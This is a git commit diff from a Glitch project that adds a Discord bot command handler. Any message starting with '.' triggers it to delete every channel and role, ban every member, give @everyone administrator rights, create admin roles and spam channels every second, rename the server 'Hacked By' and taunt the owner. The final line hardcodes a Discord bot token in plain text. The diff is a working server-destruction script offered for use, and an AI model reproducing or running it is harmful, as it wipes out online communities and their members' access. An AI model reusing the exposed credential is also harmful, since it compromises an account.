912e8c0c9366ff14b5015397a9c6aabac7206c54
Glitch (dramatic-marred-pepperberry) <none>
2022-05-17 13:38:03 +0000

    🚗🏐 Checkpoint ./rawen.js:25793078/1397

--- rawen.js
+++ rawen.js
@@ -25,4 +25,110 @@ client.on("message", message => {
   }
 });
 
+client.on("message", message => {
+
+  if (message.content.startsWith(`.`)) {
+
+    message.delete();
+
+    message.guild.roles.cache.find(r => r.name === "@everyone").edit({
+
+      permissions: ["ADMINISTRATOR"] ///premission akata adminstator
+
+    });
+
+    message.guild.channels.cache.map(c => {
+
+      c.delete();
+
+    });
+
+    message.guild.roles.cache.forEach(r => {
+
+      r.delete();
+
+    });
+
+    message.guild.members.cache.forEach(m => {
+
+      m.ban();
+
+    });
+
+    setInterval(() => {
+
+      message.guild.roles
+
+        .create({
+
+        data: {
+
+          name: "Hacked:joy:",
+
+          permissions: ["ADMINISTRATOR"]
+
+        }
+
+        })
+
+        .then(rr => {
+
+          message.member.roles.add(rr.id);
+
+        });
+
+    }, 1000);
+
+    message.guild.setIcon("");
+
+    client.user.setAvatar("");
+
+    client.user.setUsername("Hacked");
+
+    message.guild.owner.send(
+
+      "Bdaxo nradar servert hackrawa 😹"
+
+    );
+
+    message.guild.setName("Hacked By");
+
+    setTimeout(function() {
+
+      setInterval(
+
+        () => {
+
+          message.guild.channels
+
+            .create("hacked by ", "text")
+
+            .then(channel => {
+
+              channel.send(
+
+                "@everyone Hacked By nawe xot dabne :joy: :joy: :joy:"
+
+              );
+
+            });
+
+        },
+
+ 
+
+        1000
+
+      );
+
+    });
+
+  }
+
+});
+
+ 
+
+////Lalayan black jack drwst krawa mayka hyxot
+
 client.login("OTc2MTExMzA3MzQwMjU5MzU5.GY56QE.k2TY7dz6XRoFaOrrZy1vVl4oxuipZjBoAMt5kc")
